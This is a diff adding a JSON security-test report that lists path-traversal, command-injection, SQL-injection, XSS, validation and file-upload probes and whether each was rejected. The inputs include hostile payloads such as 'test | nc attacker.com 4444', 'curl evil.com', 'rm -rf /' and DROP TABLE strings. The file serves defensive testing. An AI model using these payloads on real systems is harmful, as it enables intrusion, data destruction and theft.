@@ -1,0 +1,772 @@
+{
+  "timestamp": "2025-08-01T04:02:59.646Z",
+  "summary": {
+    "total": 110,
+    "passed": 102,
+    "vulnerabilities": 0,
+    "warnings": 7,
+    "errors": 0,
+    "info": 1
+  },
+  "severityBreakdown": {
+    "critical": 0,
+    "high": 0,
+    "medium": 0,
+    "low": 0
+  },
+  "results": [
+    {
+      "suite": "Path Traversal",
+      "type": "pass",
+      "input": "../../../etc/passwd",
+      "message": "Path traversal attempt rejected with error (good)"
+    },
+    {
+      "suite": "Path Traversal",
+      "type": "pass",
+      "input": "..\\..\\..\\windows\\system32\\config\\sam",
+      "message": "Path traversal attempt rejected with error (good)"
+    },
+    {
+      "suite": "Path Traversal",
+      "type": "pass",
+      "input": "....//....//....//etc/passwd",
+      "message": "Path traversal attempt rejected with error (good)"
+    },
+    {
+      "suite": "Path Traversal",
+      "type": "pass",
+      "input": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
+      "message": "Path traversal attempt rejected with error (good)"
+    },
+    {
+      "suite": "Path Traversal",
+      "type": "pass",
+      "input": "..%2F..%2F..%2Fetc%2Fpasswd",
+      "message": "Path traversal attempt rejected with error (good)"
+    },
+    {
+      "suite": "Path Traversal",
+      "type": "pass",
+      "input": "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+      "message": "Path traversal attempt rejected with error (good)"
+    },
+    {
+      "suite": "Path Traversal",
+      "type": "pass",
+      "input": "/var/log/../../../../etc/passwd",
+      "message": "Path traversal attempt rejected with error (good)"
+    },
+    {
+      "suite": "Path Traversal",
+      "type": "pass",
+      "input": "C:\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "message": "Path traversal attempt rejected with error (good)"
+    },
+    {
+      "suite": "Path Traversal",
+      "type": "pass",
+      "input": "${7*7}/../../../etc/passwd",
+      "message": "Path traversal attempt rejected with error (good)"
+    },
+    {
+      "suite": "Path Traversal",
+      "type": "pass",
+      "input": "file:///etc/passwd",
+      "message": "Path traversal attempt rejected with error (good)"
+    },
+    {
+      "suite": "Command Injection",
+      "type": "pass",
+      "input": "test; rm -rf /",
+      "message": "Command injection attempt sanitized successfully"
+    },
+    {
+      "suite": "Command Injection",
+      "type": "pass",
+      "input": "test && cat /etc/passwd",
+      "message": "Command injection attempt sanitized successfully"
+    },
+    {
+      "suite": "Command Injection",
+      "type": "pass",
+      "input": "test | nc attacker.com 4444",
+      "message": "Command injection attempt sanitized successfully"
+    },
+    {
+      "suite": "Command Injection",
+      "type": "pass",
+      "input": "test`whoami`",
+      "message": "Command injection attempt sanitized successfully"
+    },
+    {
+      "suite": "Command Injection",
+      "type": "pass",
+      "input": "test$(whoami)",
+      "message": "Command injection attempt sanitized successfully"
+    },
+    {
+      "suite": "Command Injection",
+      "type": "pass",
+      "input": "test; powershell -c \"Get-Process\"",
+      "message": "Command injection attempt sanitized successfully"
+    },
+    {
+      "suite": "Command Injection",
+      "type": "pass",
+      "input": "test & dir c:\\",
+      "message": "Command injection attempt rejected with error (good)"
+    },
+    {
+      "suite": "Command Injection",
+      "type": "pass",
+      "input": "test || curl evil.com",
+      "message": "Command injection attempt sanitized successfully"
+    },
+    {
+      "suite": "Command Injection",
+      "type": "pass",
+      "input": "test; sleep 10",
+      "message": "Command injection attempt sanitized successfully"
+    },
+    {
+      "suite": "Command Injection",
+      "type": "pass",
+      "input": "injection\nwhoami",
+      "message": "Command injection attempt sanitized successfully"
+    },
+    {
+      "suite": "Command Injection",
+      "type": "pass",
+      "input": "test\r\nping google.com",
+      "message": "Command injection attempt sanitized successfully"
+    },
+    {
+      "suite": "Command Injection",
+      "type": "pass",
+      "input": "test\u0000whoami",
+      "message": "Command injection attempt sanitized successfully"
+    },
+    {
+      "suite": "SQL Injection",
+      "type": "pass",
+      "input": "'; DROP TABLE users; --",
+      "message": "SQL injection attempt rejected with error (good)"
+    },
+    {
+      "suite": "SQL Injection",
+      "type": "pass",
+      "input": "' OR '1'='1",
+      "message": "SQL injection attempt blocked successfully"
+    },
+    {
+      "suite": "SQL Injection",
+      "type": "pass",
+      "input": "' UNION SELECT * FROM users --",
+      "message": "SQL injection attempt rejected with error (good)"
+    },
+    {
+      "suite": "SQL Injection",
+      "type": "pass",
+      "input": "'; INSERT INTO users VALUES ('hacker', 'password'); --",
+      "message": "SQL injection attempt rejected with error (good)"
+    },
+    {
+      "suite": "SQL Injection",
+      "type": "pass",
+      "input": "admin'--",
+      "message": "SQL injection attempt rejected with error (good)"
+    },
+    {
+      "suite": "SQL Injection",
+      "type": "pass",
+      "input": "' OR 1=1 #",
+      "message": "SQL injection attempt rejected with error (good)"
+    },
+    {
+      "suite": "SQL Injection",
+      "type": "pass",
+      "input": "') OR ('1'='1",
+      "message": "SQL injection attempt blocked successfully"
+    },
+    {
+      "suite": "SQL Injection",
+      "type": "pass",
+      "input": "'; EXEC xp_cmdshell('dir'); --",
+      "message": "SQL injection attempt rejected with error (good)"
+    },
+    {
+      "suite": "SQL Injection",
+      "type": "pass",
+      "input": "' UNION SELECT password FROM users WHERE '1'='1",
+      "message": "SQL injection attempt rejected with error (good)"
+    },
+    {
+      "suite": "SQL Injection",
+      "type": "pass",
+      "input": "1'; WAITFOR DELAY '00:00:05'; --",
+      "message": "SQL injection attempt rejected with error (good)"
+    },
+    {
+      "suite": "SQL Injection",
+      "type": "pass",
+      "input": "' OR SLEEP(5) --",
+      "message": "SQL injection attempt rejected with error (good)"
+    },
+    {
+      "suite": "SQL Injection",
+      "type": "pass",
+      "input": "'; SHUTDOWN; --",
+      "message": "SQL injection attempt rejected with error (good)"
+    },
+    {
+      "suite": "XSS",
+      "type": "pass",
+      "input": "<script>alert(\"XSS\")</script>",
+      "message": "XSS attempt sanitized successfully"
+    },
+    {
+      "suite": "XSS",
+      "type": "pass",
+      "input": "<img src=\"x\" onerror=\"alert(1)\">",
+      "message": "XSS attempt sanitized successfully"
+    },
+    {
+      "suite": "XSS",
+      "type": "pass",
+      "input": "javascript:alert(\"XSS\")",
+      "message": "XSS attempt sanitized successfully"
+    },
+    {
+      "suite": "XSS",
+      "type": "pass",
+      "input": "<svg onload=\"alert(1)\">",
+      "message": "XSS attempt sanitized successfully"
+    },
+    {
+      "suite": "XSS",
+      "type": "pass",
+      "input": "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+      "message": "XSS attempt sanitized successfully"
+    },
+    {
+      "suite": "XSS",
+      "type": "pass",
+      "input": "<iframe src=\"javascript:alert(`xss`)\">",
+      "message": "XSS attempt sanitized successfully"
+    },
+    {
+      "suite": "XSS",
+      "type": "pass",
+      "input": "<object data=\"javascript:alert(1)\">",
+      "message": "XSS attempt sanitized successfully"
+    },
+    {
+      "suite": "XSS",
+      "type": "pass",
+      "input": "<embed src=\"javascript:alert(1)\">",
+      "message": "XSS attempt sanitized successfully"
+    },
+    {
+      "suite": "XSS",
+      "type": "pass",
+      "input": "<form><button formaction=\"javascript:alert(1)\">XSS</button></form>",
+      "message": "XSS attempt sanitized successfully"
+    },
+    {
+      "suite": "XSS",
+      "type": "pass",
+      "input": "<marquee onstart=\"alert(1)\">",
+      "message": "XSS attempt sanitized successfully"
+    },
+    {
+      "suite": "XSS",
+      "type": "pass",
+      "input": "<isindex action=\"javascript:alert(1)\" type=\"submit\">",
+      "message": "XSS attempt sanitized successfully"
+    },
+    {
+      "suite": "XSS",
+      "type": "pass",
+      "input": "<body onload=\"alert(1)\">",
+      "message": "XSS attempt sanitized successfully"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "projectName",
+      "input": "",
+      "message": "projectName correctly rejected invalid input"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "projectName",
+      "input": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+      "output": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+      "message": "projectName validation passed"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "projectName",
+      "input": "project with spaces",
+      "output": "projectwithspaces",
+      "message": "projectName validation passed"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "projectName",
+      "input": "project-with-dashes",
+      "output": "project-with-dashes",
+      "message": "projectName validation passed"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "projectName",
+      "input": "project_with_underscores",
+      "output": "project_with_underscores",
+      "message": "projectName validation passed"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "projectName",
+      "input": "project123",
+      "output": "project123",
+      "message": "projectName validation passed"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "projectName",
+      "input": "../malicious",
+      "output": "malicious",
+      "message": "projectName validation passed"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "projectName",
+      "input": "project\u0000null",
+      "output": "projectnull",
+      "message": "projectName validation passed"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "projectName",
+      "input": "project\nnewline",
+      "output": "projectnewline",
+      "message": "projectName validation passed"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "projectName",
+      "input": "project<script>",
+      "output": "projectscript",
+      "message": "projectName validation passed"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "projectName",
+      "input": "DROP TABLE projects",
+      "output": "DROPTABLEprojects",
+      "message": "projectName validation passed"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "email",
+      "input": "valid@example.com",
+      "output": "valid@example.com",
+      "message": "email validation passed"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "warning",
+      "inputType": "email",
+      "input": "invalid-email",
+      "message": "email rejected potentially valid input: Invalid email format"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "warning",
+      "inputType": "email",
+      "input": "user@",
+      "message": "email rejected potentially valid input: Invalid email format"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "warning",
+      "inputType": "email",
+      "input": "@domain.com",
+      "message": "email rejected potentially valid input: Invalid email format"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "warning",
+      "inputType": "email",
+      "input": "user..double.dot@example.com",
+      "message": "email rejected potentially valid input: Invalid email format"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "warning",
+      "inputType": "email",
+      "input": "user@domain",
+      "message": "email rejected potentially valid input: Invalid email format"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "warning",
+      "inputType": "email",
+      "input": "user name@example.com",
+      "message": "email rejected potentially valid input: Invalid email format"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "email",
+      "input": "<script>@example.com",
+      "message": "email correctly rejected invalid input"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "email",
+      "input": "user@example.com\u0000null",
+      "message": "email correctly rejected invalid input"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "url",
+      "input": "https://example.com",
+      "output": "https://example.com",
+      "message": "url validation passed"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "url",
+      "input": "http://example.com",
+      "output": "http://example.com",
+      "message": "url validation passed"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "url",
+      "input": "ftp://example.com",
+      "output": "ftp://example.com",
+      "message": "url validation passed"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "url",
+      "input": "javascript:alert(1)",
+      "message": "url correctly rejected invalid input"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "url",
+      "input": "data:text/html,<script>alert(1)</script>",
+      "message": "url correctly rejected invalid input"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "warning",
+      "inputType": "url",
+      "input": "file:///etc/passwd",
+      "message": "url rejected potentially valid input: Invalid URL format"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "url",
+      "input": "https://evil.com@good.com",
+      "output": "https://evil.com@good.com",
+      "message": "url validation passed"
+    },
+    {
+      "suite": "Input Validation",
+      "type": "pass",
+      "inputType": "url",
+      "input": "https://example.com\u0000.evil.com",
+      "message": "url correctly rejected invalid input"
+    },
+    {
+      "suite": "Authentication",
+      "type": "pass",
+      "test": "Weak Password",
+      "input": "123456",
+      "message": "Weak password should be rejected by system"
+    },
+    {
+      "suite": "Authentication",
+      "type": "pass",
+      "test": "Weak Password",
+      "input": "password",
+      "message": "Weak password should be rejected by system"
+    },
+    {
+      "suite": "Authentication",
+      "type": "pass",
+      "test": "Weak Password",
+      "input": "admin",
+      "message": "Weak password should be rejected by system"
+    },
+    {
+      "suite": "Authentication",
+      "type": "pass",
+      "test": "Weak Password",
+      "input": "12345678",
+      "message": "Weak password should be rejected by system"
+    },
+    {
+      "suite": "Authentication",
+      "type": "pass",
+      "test": "Weak Password",
+      "input": "qwerty",
+      "message": "Weak password should be rejected by system"
+    },
+    {
+      "suite": "Authentication",
+      "type": "pass",
+      "test": "Weak Password",
+      "input": "abc123",
+      "message": "Weak password should be rejected by system"
+    },
+    {
+      "suite": "Authentication",
+      "type": "pass",
+      "test": "Weak Password",
+      "input": "password123",
+      "message": "Weak password should be rejected by system"
+    },
+    {
+      "suite": "Authentication",
+      "type": "pass",
+      "test": "Weak Password",
+      "input": "",
+      "message": "Weak password should be rejected by system"
+    },
+    {
+      "suite": "Authentication",
+      "type": "pass",
+      "test": "Weak Password",
+      "input": "a",
+      "message": "Weak password should be rejected by system"
+    },
+    {
+      "suite": "Authentication",
+      "type": "pass",
+      "test": "Weak Password",
+      "input": "Admin123",
+      "message": "Weak password should be rejected by system"
+    },
+    {
+      "suite": "Authentication",
+      "type": "info",
+      "message": "Full authentication testing requires runtime environment"
+    },
+    {
+      "suite": "Configuration",
+      "type": "pass",
+      "configKey": "NODE_ENV",
+      "input": "development",
+      "output": "development",
+      "message": "Configuration value processed"
+    },
+    {
+      "suite": "Configuration",
+      "type": "pass",
+      "configKey": "NODE_ENV",
+      "input": "production",
+      "output": "production",
+      "message": "Configuration value processed"
+    },
+    {
+      "suite": "Configuration",
+      "type": "pass",
+      "configKey": "NODE_ENV",
+      "input": "test",
+      "output": "test",
+      "message": "Configuration value processed"
+    },
+    {
+      "suite": "Configuration",
+      "type": "pass",
+      "configKey": "NODE_ENV",
+      "input": "staging",
+      "output": "staging",
+      "message": "Configuration value processed"
+    },
+    {
+      "suite": "Configuration",
+      "type": "pass",
+      "configKey": "DEBUG",
+      "input": "true",
+      "output": "true",
+      "message": "Configuration value processed"
+    },
+    {
+      "suite": "Configuration",
+      "type": "pass",
+      "configKey": "DEBUG",
+      "input": "false",
+      "output": "false",
+      "message": "Configuration value processed"
+    },
+    {
+      "suite": "Configuration",
+      "type": "pass",
+      "configKey": "DEBUG",
+      "input": "1",
+      "output": "1",
+      "message": "Configuration value processed"
+    },
+    {
+      "suite": "Configuration",
+      "type": "pass",
+      "configKey": "DEBUG",
+      "input": "0",
+      "output": "0",
+      "message": "Configuration value processed"
+    },
+    {
+      "suite": "Configuration",
+      "type": "pass",
+      "configKey": "DEBUG",
+      "input": "*",
+      "output": "*",
+      "message": "Configuration value processed"
+    },
+    {
+      "suite": "Configuration",
+      "type": "pass",
+      "configKey": "PORT",
+      "input": "80",
+      "output": "80",
+      "message": "Configuration value processed"
+    },
+    {
+      "suite": "Configuration",
+      "type": "pass",
+      "configKey": "PORT",
+      "input": "443",
+      "output": "443",
+      "message": "Configuration value processed"
+    },
+    {
+      "suite": "Configuration",
+      "type": "pass",
+      "configKey": "PORT",
+      "input": "3000",
+      "output": "3000",
+      "message": "Configuration value processed"
+    },
+    {
+      "suite": "Configuration",
+      "type": "pass",
+      "configKey": "PORT",
+      "input": "8080",
+      "output": "8080",
+      "message": "Configuration value processed"
+    },
+    {
+      "suite": "Configuration",
+      "type": "pass",
+      "configKey": "PORT",
+      "input": "65536",
+      "output": "65536",
+      "message": "Configuration value processed"
+    },
+    {
+      "suite": "Configuration",
+      "type": "pass",
+      "configKey": "PORT",
+      "input": "invalid",
+      "output": "invalid",
+      "message": "Configuration value processed"
+    },
+    {
+      "suite": "File Upload",
+      "type": "pass",
+      "filename": "test.exe",
+      "fileType": "executable",
+      "message": "Dangerous file correctly rejected"
+    },
+    {
+      "suite": "File Upload",
+      "type": "pass",
+      "filename": "script.js",
+      "fileType": "script",
+      "message": "Dangerous file correctly rejected"
+    },
+    {
+      "suite": "File Upload",
+      "type": "pass",
+      "filename": "shell.php",
+      "fileType": "script",
+      "message": "Dangerous file correctly rejected"
+    },
+    {
+      "suite": "File Upload",
+      "type": "pass",
+      "filename": "payload.jsp",
+      "fileType": "script",
+      "message": "Dangerous file correctly rejected"
+    },
+    {
+      "suite": "File Upload",
+      "type": "pass",
+      "filename": "backdoor.asp",
+      "fileType": "script",
+      "message": "Dangerous file correctly rejected"
+    },
+    {
+      "suite": "File Upload",
+      "type": "pass",
+      "filename": "test.bat",
+      "fileType": "script",
+      "message": "Dangerous file correctly rejected"
+    },
+    {
+      "suite": "File Upload",
+      "type": "pass",
+      "filename": "malware.scr",
+      "fileType": "executable",
+      "message": "Dangerous file correctly rejected"
+    },
+    {
+      "suite": "File Upload",
+      "type": "pass",
+      "filename": "../../../etc/passwd",
+      "fileType": "path traversal",
+      "message": "Dangerous file correctly rejected"
+    },
+    {
+      "suite": "File Upload",
+      "type": "pass",
+      "filename": "file.txt\u0000.exe",
+      "fileType": "null byte injection",
+      "message": "Dangerous file correctly rejected"
+    },
+    {
+      "suite": "File Upload",
+      "type": "pass",
+      "filename": "very_long_filename_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.txt",
+      "fileType": "long filename",
+      "message": "Dangerous file correctly rejected"
+    }
+  ],
+  "securityScore": 100
+}
